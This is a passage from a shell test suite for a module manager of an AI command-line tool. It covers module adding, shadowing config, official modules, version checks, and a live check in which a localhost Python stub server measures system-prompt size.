  refused "holds a mods cards marker line"
  printf 'has a CR\r\n' >"$W/bad/.henki/card.md"
  run verify --dir "$W/bad"
  refused "card.md: holds U+000D"
}

t_shadow() {
  case_ "shadow: the line to add, and verify warns while it is missing"
  local bin="$W/userbin"
  mkdir -p "$bin"
  printf '#!/bin/sh\n' >"$bin/pbtool" && chmod 755 "$bin/pbtool"
  mkmod "$W/wrap" 'shadow = ["wrap/other"]\n'
  printf '#!/bin/sh\n' >"$W/wrap/bin/pbtool" && chmod 755 "$W/wrap/bin/pbtool"
  mkdir -p "$CONF"
  printf 'model = "m"\nshadow = ["halti/halti"]  # kept\n' >"$CONF/config.toml"
  PATH="$bin:$PATH" run add "$W/wrap" --yes
  rc_is 0
  out_has 'shadows  wrap/other wrap/pbtool'
  out_has 'shadow = ["halti/halti", "wrap/other", "wrap/pbtool"]'
  PATH="$bin:$PATH" run verify
  rc_is 0
  err_has 'warning: wrap: henki does not start until ~/.config/henki/config.toml has: shadow = ['
  printf 'model = "m"\nshadow = ["halti/halti", "wrap/other", "wrap/pbtool"]\n' >"$CONF/config.toml"
  PATH="$bin:$PATH" run verify
  rc_is 0
  err_lacks "warning"
  printf 'ext = ["/somewhere/else"]\n' >>"$CONF/config.toml"
  run list
  err_has "sets ext without ~/.config/henki/ext"
}

t_official() {
  case_ "official modules, --version"
  local share="$W/share" bin="$W/bin"
  mkmod "$share/official/halti"
  mkmod "$share/official/itse"
  HENKI_SHARE="$share" run list
  out_has "official, not added: halti itse"
  HENKI_SHARE="$share" run add halti --yes
  rc_is 0
  out_has "source   official ($share/official/halti)"
  check "KIND official, SOURCE the name" [ "$(field halti 5):$(field halti 6)" = official:halti ]
  HENKI_SHARE="$share" run list
  out_has "official, not added: itse"
  run add nothere --yes
  refused "no official module nothere"
  # Shipped next to a henki: its version, and the tarball's share/ dir without HENKI_SHARE.
  mkdir -p "$bin/bin" "$bin/share/henki"
  cp "$MODS" "$bin/bin/henki-mods"
  cp -R "$share/official" "$bin/share/henki/official"
  printf '#!/bin/sh\necho "henki 0.1.0 (abc, x86_64-linux)"\n' >"$bin/bin/henki"
  chmod 755 "$bin/bin/henki"
  RC=0
  OUT=$($RUN "$bin/bin/henki-mods" --version 2>&1) || RC=$?
  check "--version from the henki next to it" [ "$OUT" = "henki-mods 0.1.0" ]
  run --version
  check "--version without one" [ "$OUT" = "henki-mods dev" ]
  ln -s "$bin/bin/henki-mods" "$W/link-to-mods"
  OUT=$($RUN "$W/link-to-mods" add itse --yes 2>&1) || RC=$?
  rc_is 0
  check "found through a link" [ "$(field itse 5)" = official ]
  mkmod "$W/future" 'requires = ["henki >= 0.2"]\n'
  RC=0
  ERR=$($RUN "$bin/bin/henki-mods" add "$W/future" --yes 2>&1 >/dev/null) || RC=$?
  refused "future needs henki >= 0.2, and this henki is 0.1.0"
  rm -rf "$W/future" && mkmod "$W/future" 'requires = ["henki >= 0.1"]\n'
  RC=0
  $RUN "$bin/bin/henki-mods" add "$W/future" --yes >/dev/null 2>&1 || RC=$?
  rc_is 0
}

# The live check: the system prompt of real henki requests, without modules and with them, sent to a stub that
# records its length in bytes.
t_live() {
  case_ "list's bytes are what henki really adds (henki run --json)"
  if [ -z "$HENKI_BIN" ]; then
    echo "tests.sh: the live prompt check was SKIPPED (set MODS_TEST_HENKI to a henki binary)" >&2
    return
  fi
  command -v python3 >/dev/null 2>&1 || {
    fail "python3 is not on PATH, and the live check needs it for its stub server"
    return
  }
  local d="$W/stub" port i base with work="$W/work"
  mkdir -p "$d" "$work" "$CONF"
  cat >"$d/stub.py" <<'PY'
import http.server, json, socketserver, sys
out, portfile = sys.argv[1], sys.argv[2]
def chunk(delta, finish=None):
    return "data: " + json.dumps({"choices": [{"index": 0, "delta": delta, "finish_reason": finish}], "object": "chat.completion.chunk"}) + "\n\n"
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        system = [m["content"] for m in body["messages"] if m["role"] == "system"][0]
        with open(out, "a") as f:
            f.write("%d\n" % len(system.encode()))
        sse = (chunk({"role": "assistant", "content": "ok"}) + chunk({}, "stop") + "data: [DONE]\n\n").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(sse)))
        self.end_headers()
        self.wfile.write(sse)
    def log_message(self, *a):
        pass
s = socketserver.TCPServer(("127.0.0.1", 0), H)
open(portfile, "w").write(str(s.server_address[1]))
s.serve_forever()
PY
  python3 -I "$d/stub.py" "$d/sizes" "$d/port" &
  local pid=$!
  i=0
  while [ ! -s "$d/port" ] && [ $i -lt 100 ]; do
    sleep 0.1 2>/dev/null || sleep 1
    i=$((i + 1))
  done
  port=$(cat "$d/port" 2>/dev/null)
  if [ -z "$port" ]; then
    kill "$pid" 2>/dev/null
    fail "the stub server did not start"
    return
  fi
  printf 'model = "m"\nbase_url = "http://127.0.0.1:%s/v1"\n' "$port" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  live_run() { (cd "$work" && env -u XDG_CONFIG_HOME "$HENKI_BIN" run --json hi >"$d/run.out" 2>&1) || fail "henki run failed: $(cat "$d/run.out")"; }
  live_run
  base=$(tail -n 1 "$d/sizes")
  mkmod "$W/alpha"
  printf '## alpha: one line\n' >"$W/alpha/doc.md"
  mkmod "$W/beta"
  printf 'A card for beta.\n\nTwo paragraphs.\n' >"$W/beta/.henki/card.md"
  run add "$W/alpha" --yes
  run add "$W/beta" --yes
  run list
  live_run
  with=$(tail -n 1 "$d/sizes")
  out_has "on: $(num $((with - base))) B of prompt"
  run off beta
  run list
  live_run
  with=$(tail -n 1 "$d/sizes")
  out_has "on: $(num $((with - base))) B of prompt"
  kill "$pid" 2>/dev/null
  wait "$pid" 2>/dev/null
}

all() {
  t_add_path
  t_ask
  t_git
  t_raw_blobs
  t_hd1
  t_refusals
  t_gitattributes
  t_lock_newer
  t_onoff
  t_verify
  t_list_bytes
  t_cards
  t_shadow
  t_official
}

static_bash32
RUN=bash
all
t_live
# POSIX mode turns off some bash behaviour a script may lean on without knowing; the manager must not.
RUN="bash --posix"
all
if [ "$FAILS" != 0 ]; then
  echo "tests.sh: $FAILS checks failed in $CASES cases" >&2
  exit 1
fi
echo "tests.sh: $CASES cases passed"
